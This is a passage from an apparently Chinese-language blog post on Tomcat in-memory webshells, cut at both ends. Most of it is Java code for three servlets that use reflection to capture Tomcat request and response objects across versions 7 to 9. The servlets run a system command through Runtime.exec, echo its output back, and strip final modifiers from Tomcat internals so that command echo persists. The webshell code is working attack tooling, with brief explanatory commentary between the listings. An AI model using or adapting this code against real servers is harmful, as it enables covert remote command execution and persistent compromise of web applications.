class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Service;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.AbstractProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**流程</span></span><br><span class="line"><span class="comment"> WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;</span></span><br><span class="line"><span class="comment"> StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;</span></span><br><span class="line"><span class="comment"> RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        //这里的代码也是为了获取 standardContext，tomcat8.5.77 测试可以使用。8.5.82之后就不行了，getResources返回值为null</span></span><br><span class="line"><span class="comment">        //WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span></span><br><span class="line"><span class="comment">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取运行中的 standardContext，和之前的三个马一样,也可以用上面注释掉的方法，但是我的tomcat版本刚好高了一点，不行。</span></span><br><span class="line">        <span class="comment">//等效流程 WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                获取 StandardContext 中的 context</span></span><br><span class="line"><span class="comment">                反射获取 ApplicationContext 上下文，因为其为 protected 修饰的</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取context中的service</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">service</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            service.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService)service.get(ApplicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取service中的connectors</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connector = (Connector[])connectors.get(standardService);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                现在目的是反射获取 AbstractProtocol$ConnectionHandler 实例，这里可以直接反射获取所有的 AbstractProtocol 类集合，</span></span><br><span class="line"><span class="comment">                对其进行遍历时通过 if 找到正确的AbstractProtocol类 （org.apache.coyote.AbstractProtocol$ConnectionHandler）</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line"><span class="comment">/*      我看其他师傅也有这种写法，没研究啥原理，这样写的话，就可以少最外层的for循环和if判断，这里的connectors1[0]就很玄幻，为啥确定在这，因为想在短时间内学完内存马，急着用所以没仔细研究，以后有空回头来研究</span></span><br><span class="line"><span class="comment">            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();</span></span><br><span class="line"><span class="comment">            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span></span><br><span class="line"><span class="comment">            handler.setAccessible(true);</span></span><br><span class="line"><span class="comment">            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            Class&lt;?&gt;[] AbstractProtocol_list = Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredClasses();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; aClass : AbstractProtocol_list) &#123;</span><br><span class="line">                <span class="keyword">if</span> (aClass.getName().length()==<span class="number">52</span>)&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射获取global 和 RequestGroupInfo中的 processors</span></span><br><span class="line"><span class="comment">                    **/</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processors.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射实现了 RequestGroupInfo(global) ，调用方法获取到了全局的 requestGroupInfo</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[<span class="number">0</span>].getProtocolHandler(), <span class="literal">null</span>));</span><br><span class="line">                    java.util.List&lt;RequestInfo&gt; RequestInfo_list = (java.util.List&lt;RequestInfo&gt;) processors.get(requestGroupInfo);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">req</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    req.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        这里就遍历每个 requestInfo ，获取他们的req,再获取 response，就能达到回显的目的了</span></span><br><span class="line"><span class="comment">                    * */</span></span><br><span class="line">                    <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfo_list) &#123;</span><br><span class="line">                        org.apache.coyote.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (org.apache.coyote.Request )req.get(requestInfo);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request2</span> <span class="operator">=</span> ( org.apache.catalina.connector.Request)request1.getNote(<span class="number">1</span>);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response2</span> <span class="operator">=</span> request2.getResponse();</span><br><span class="line">                        response2.getWriter().write(<span class="string">&quot;TomcatEcho_General Injection success !&quot;</span>);</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">whoami</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).getInputStream();</span><br><span class="line">                        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(whoami);</span><br><span class="line">                        <span class="type">int</span> b ;</span><br><span class="line">                        <span class="keyword">while</span> ((b = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                            response2.getWriter().write(b);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObj</span><span class="params">(Object obj, String attr)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(attr);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>文章二的大佬还提供了另一个可以在 7，8，9 中均可使用的链子（以下是他说的上面的链子在 8 中会有小小的版本限制，在7中又缺失context的话）</p>
<blockquote>
<p>tomcat 8 的小版本有限制主要原因是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\2804790-20220428003041172-926221891.png"
                      alt="image-20220427234613127"
                ></p>
<p>原因是<code>Tomcat7</code>获取到的<code>WebappClassLoaderBase</code>中没有context属性，所以会利用失败）</p>
</blockquote>
<p>tomcat 8 版本小问题确实存在，我上面也说了，我也遇到了。这个7这个base中不存在context属性。这俩在我看来的解决办法就是我上面提到的，使用 <code>getSession</code> 反射的方式来获取。当然，这个师傅也提供了他的解决思路，具体如下，我们也可以看看。</p>
<h4 id="马2"><a href="#马2" class="headerlink" title="马2"></a>马2</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Tomcat7Servlet&quot;, value = &quot;/Tomcat7Servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General_789</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> flag=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),<span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt; threads.length;i++)&#123;</span><br><span class="line">                Thread thread=threads[i];</span><br><span class="line">                String threadName=thread.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Object target= getField(thread,<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    Object this0=getField(target,<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    Object handler=getField(this0,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    Object global=getField(handler,<span class="string">&quot;global&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    ArrayList processors=(ArrayList) getField(global,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; processors.size(); j++) &#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processors.get(j);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo!=<span class="literal">null</span>)&#123;</span><br><span class="line">                            Request req=(Request) getField(requestInfo,<span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span>(org.apache.catalina.connector.Request) req.getNote(<span class="number">1</span>);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response1</span> <span class="operator">=</span>request1.getResponse();</span><br><span class="line"></span><br><span class="line">                            Writer writer=response.getWriter();</span><br><span class="line">                            writer.flush();</span><br><span class="line">                            writer.write(<span class="string">&quot;TomcatEcho789&quot;</span>);</span><br><span class="line">                            flag=<span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getField</span><span class="params">(Object obj,String fieldName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=<span class="literal">null</span>;</span><br><span class="line">        Class clas=obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clas!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field=clas.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">                clas=clas.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (field!=<span class="literal">null</span>)&#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(obj);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="半通用回显"><a href="#半通用回显" class="headerlink" title="半通用回显"></a>半通用回显</h3><p>根据前文思路顺着堆栈一路向下查看Request和Response存储位置，只要获取到一个实例即可。</p>
<p>顺着思路，在<code>org.apache.catalina.core.ApplicationFilterChain</code>位置发现符合条件的变量。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br></pre></td></tr></table></figure></div>

<p><strong>ApplicationFilterChain#internalDoFilter 赋值</strong> </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123; <span class="comment">// 设置为true</span></span><br><span class="line">    lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">    lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>添加思路:</strong></p>
<blockquote>
<ul>
<li><p>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p>
</li>
<li><p>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p>
</li>
<li><p>从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p>
</li>
</ul>
</blockquote>
<h4 id="tomcat半通用回显马"><a href="#tomcat半通用回显马" class="headerlink" title="tomcat半通用回显马"></a>tomcat半通用回显马</h4><p>（我看这哥们在tomcat半回显的基础上加上了恶意构造的Filter，通过前面对Filter的学习，这里还是好理解）</p>
<p><strong>半通用回显：</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_Half</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">wrap_same_object</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>).getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            wrap_same_object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//修改final</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersField.setInt(lastServicedResponse, 